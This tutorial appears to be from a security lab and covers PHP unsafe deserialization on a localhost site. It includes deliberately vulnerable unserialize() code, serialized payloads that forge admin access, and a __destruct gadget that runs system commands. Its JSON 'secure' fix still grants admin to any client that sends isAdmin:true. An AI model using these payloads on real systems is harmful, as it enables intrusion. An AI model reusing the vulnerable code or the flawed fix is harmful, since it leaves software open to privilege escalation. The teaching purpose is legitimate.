# Example of Unsafe Deserialization Vulnerability

This type of vulnerability consists of injecting serialized objects into the URL of a website to inject code into that site.

### Vulnerable Code

http://localhost:8080/UNSAFE_DESERIALIZATION/deserialize_original.php

```
<?php
/*Define the User Class */

class User {
    public $username;
    public $isAdmin = false;
}
/* Show a Text if the User has isAdmin in true*/

$data = unserialize($_GET['data']);
if ($data->isAdmin) {
    echo "¡Acceso de administrador concedido!";
}
?>
```

This script defines an object with an `isAdmin` parameter that, if true, allows logging in as administrator.

#### Get Exploit

http://localhost:8080/UNSAFE_DESERIALIZATION/eje_desi.php

```
<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
```

This website generates a serialized `User` object where `isAdmin` is set to true.

![alt text](./images/Unsafe%20User.png)

If you put that string in the URL as the `data` parameter, you can log in as administrator to the website:

http://localhost:8080/UNSAFE_DESERIALIZATION/deserialize_original.php?data=O%3A4%3A"User"%3A2%3A%7Bs%3A8%3A"username"%3Bs%3A6%3A"hacker"%3Bs%3A7%3A"isAdmin"%3Bb%3A1%3B%7D

![alt text](./images/Login%20with%20object.png)

If you want to execute system commands on the server, you could try injecting an exploit class that runs a command when an object of that class is destroyed:

```
/*Define the Exploit Class */
class Exploit {
    public $cmd;
    
    /* Execute the command in the cmd param when the object is destoyed */
    public function __destruct() {
        system($this-> cmd);
    }
}
?>
```

The following website generates an exploit that executes the `pwd` command:

http://localhost:8080/UNSAFE_DESERIALIZATION/exploit.php

![alt text](./images/Create%20Exploit%20Object.png)

#### Execute Exploit

If you place that serialized object in the URL, you will see the output of the `pwd` command:

```
http://localhost:8080/UNSAFE_DESERIALIZATION/deserialize.php?data=O%3A7%3A"Exploit"%3A1%3A%7Bs%3A3%3A"cmd"%3Bs%3A3%3A"pwd"%3B%7D
```

### Secure Code

You can secure this code by using JSON for data reading, preventing object injection into the website.

```
<?php
/*Define the User Class */
class User {
    public $username;
    public $isAdmin = false;
}
/* Get the data content or create a empty object if data not exists */
$json = $_GET['data'] ?? "{}";

/*Decode the JSON*/
$data = json_decode($json, true);

/* If the JSON decoded isn't a array finish the execution*/
if (!is_array($data)) {
    die("Formato de datos no valido");
}

/* Si existe el parametro isAdmin y este es verdadero concede el inicio de sesión */
if (isset ($data ["isAdmin"]) && $data["isAdmin"] === true) {
    echo "Acceso de administrador concedido";
} else {
    echo "Acceso normal";
}
?>
```

http://localhost:8080/UNSAFE_DESERIALIZATION/deserialize_json.php?data={"username":"hacker","isAdmin":true}

![alt text](./images/JSON%20Login.png)

If you want to further secure the website, you can limit allowed JSON parameters to prevent code injection.

http://localhost:8080/UNSAFE_DESERIALIZATION/deserialize_full.php?data={"isAdmin":true,%20"bypass":"0"}

![alt text](./images/Invalid%20JSON%20Example.png)